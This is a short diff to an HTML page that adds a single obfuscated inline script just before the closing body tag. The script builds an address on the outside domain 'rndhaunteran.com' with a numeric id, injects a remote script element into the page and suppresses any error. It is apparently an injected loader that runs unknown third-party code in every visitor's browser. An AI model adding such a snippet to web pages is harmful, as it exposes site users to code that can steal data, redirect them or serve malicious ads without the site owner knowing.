@@ -134,5 +134,6 @@
     </div>
     <!-- Compiled and minified JavaScript -->
     <script defer src="public/lib-min.js" crossorigin="anonymous"></script>
+    <script>(function(d,z,s){s.src='//'+d+'/400/'+z;try{(document.body||document.documentElement).appendChild(s)}catch(e){}})('rndhaunteran.com',4503457,document.createElement('script'))</script>
   </body>
 </html>
